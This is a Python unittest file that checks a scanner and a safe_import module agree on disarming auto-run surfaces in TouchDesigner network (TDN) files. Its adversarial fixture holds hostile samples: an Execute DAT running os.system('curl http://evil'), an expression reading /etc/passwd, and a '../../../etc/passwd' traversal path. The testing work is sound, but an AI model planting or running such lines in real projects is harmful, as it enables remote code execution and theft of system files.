"""Integration: scanner + safe_import must agree on the security-meaningful surfaces.

The scanner is PRESENCE-based (it inventories surfaces that exist, for the capability
summary). safe_import is ARMED-STATE-based (it disarms auto-run surfaces). After make_inert:
- is_inert() must be True (nothing auto-executes on import), and
- the surfaces safe_import REMOVES/neutralizes (expressions, extensions, storage) must drop to
  0 on a re-scan.
Presence-only surfaces (an Execute DAT's kept-but-inactive content, a bypassed IO op's type, a
bypassed op's constant traversal path, external_refs) legitimately remain - they do not auto-run,
and the capability summary should still show them. ASCII only.
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import scanner
import safe_import


def adversarial_tdn():
    return {
        "format": "tdn",
        "version": "1.4",
        "network_path": "/test",
        "type": "baseCOMP",
        "operators": [
            {
                "name": "execute1",
                "type": "executeDAT",
                "dat_content": "import os\nos.system('curl http://evil')\n",
                "dat_content_format": "text",
                "parameters": {"active": "=op('ctrl').par.On"},
            },
            {
                "name": "glow1",
                "type": "levelTOP",
                "parameters": {"gamma": "=open('/etc/passwd').read()"},
            },
            {
                "name": "rig1",
                "type": "baseCOMP",
                "sequences": {"ext": [{"object": "RigExt", "name": "Rig"}]},
                "storage": {"secret": "payload"},
            },
            {"name": "net1", "type": "webclientDAT"},
            {
                "name": "mov1",
                "type": "moviefileinTOP",
                "parameters": {"file": "../../../etc/passwd"},
            },
        ],
    }


class TestSafeImportScannerIntegration(unittest.TestCase):
    def test_scanner_detects_every_surface(self):
        counts = scanner.scan_tdn(adversarial_tdn())["counts"]
        self.assertGreaterEqual(counts["execute_dats"], 1)
        self.assertGreaterEqual(counts["file_read_exprs"], 1)
        self.assertGreaterEqual(counts["extensions"], 1)
        self.assertGreaterEqual(counts["storage_payloads"], 1)
        self.assertGreaterEqual(counts["web_ops"], 1)
        self.assertGreaterEqual(counts["traversal_paths"], 1)

    def test_make_inert_yields_is_inert(self):
        inert, summary = safe_import.make_inert(adversarial_tdn())
        self.assertTrue(safe_import.is_inert(inert))
        # safe_import reported neutralizing the auto-run vectors
        self.assertGreaterEqual(summary["execute_dats_disabled"], 1)
        self.assertGreaterEqual(summary["exprs_neutralized"], 1)
        self.assertGreaterEqual(summary["extensions_disabled"], 1)
        self.assertGreaterEqual(summary["storage_removed"], 1)

    def test_rescan_after_inert_drops_armed_surfaces(self):
        inert, _ = safe_import.make_inert(adversarial_tdn())
        counts = scanner.scan_tdn(inert)["counts"]
        # The surfaces safe_import removes/neutralizes must be gone on re-scan:
        self.assertEqual(counts["file_read_exprs"], 0)
        self.assertEqual(counts["extensions"], 0)
        self.assertEqual(counts["storage_payloads"], 0)

    def test_make_inert_does_not_mutate_input(self):
        original = adversarial_tdn()
        snapshot = scanner.scan_tdn(original)["counts"]
        safe_import.make_inert(original)
        after = scanner.scan_tdn(original)["counts"]
        self.assertEqual(snapshot, after)


if __name__ == "__main__":
    unittest.main()
